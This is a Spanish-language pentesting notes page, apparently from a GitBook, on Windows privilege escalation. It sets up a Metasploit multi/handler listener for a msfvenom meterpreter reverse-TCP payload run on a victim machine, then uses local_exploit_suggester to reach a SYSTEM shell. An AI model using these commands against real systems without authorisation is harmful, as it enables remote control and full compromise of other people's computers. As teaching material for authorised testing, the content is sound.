# 🪟 Windows

## Metasploit + Msfvenom&#x20;

Podemos escalar privilegios con metasploit en windows. En primer lugar deberemos de generar un payload con msfvenom ( [#reverse-shell-tcp-con-exe](../explotacion/msfvenom.md#reverse-shell-tcp-con-exe "mention")) y pasarlo a nuestra maquina victima.

Después desde la maquina atacante, nos ponemos a la escucha con metasploit a través de multi/handler. Deberemos de ejecutar los siguientes comandos:

{% hint style="warning" %}
Los valores de los comandos de Metasploit deben ser lo mismos con los que se ha generado el payload en msfvenom (.exe) que está en la maquina victima
{% endhint %}

```bash
msfconsole

use /multi/handler

set LHOST 192.168.1.12    # IP Maquina atacante

set LPORT 4444 # Debe ser el mismo puerto que el que hemos puesto en el payload de msfvenom

set PAYLOAD windows/meterpreter/reverse_tcp # Debe ser el mismo que el que hemos puesto en el payload de msfvenom

run
```

Ahora ejecutamos el payload en la maquina victima y obtenemos una sesión de meterpreter:

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Una vez en la sesión de meterpreter (NO EN LA CMD DE WINDOWS), ponemos "`background`" y "`search local_exploit_suggester`":

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Esta opción nos dará el exploit más adecuado para la escalada, lo seleccionamos "`use 0`" y miramos las opciones que tiene. En este caso, nos pide el ID de la sesión de meterpreter:

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Ponemos el ID de la sesión (lo puedes averiguar con el comando "`sessions -l`"). Ejecutamos:

<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>

Ahora, nos aparecerá una lista en colores verde y rojo. Los payloads de color rojo deberemos de omitirlos y centrarnos en los de verde.

<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

Cualquiera de estos podría funcionar (no está asegurado), usamos uno de ellos seleccionándolo:

<figure><img src="../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

Ahora, ajustamos los valores necesarios ("`show options`"). Si el modulo funciona obtendremos una sesión de meterpreter en la que podremos abrir una shell ("`shell`") como `nt authority\system`. En el caso de que no funcione volvemos atrás ("`back`") y probamos con otro
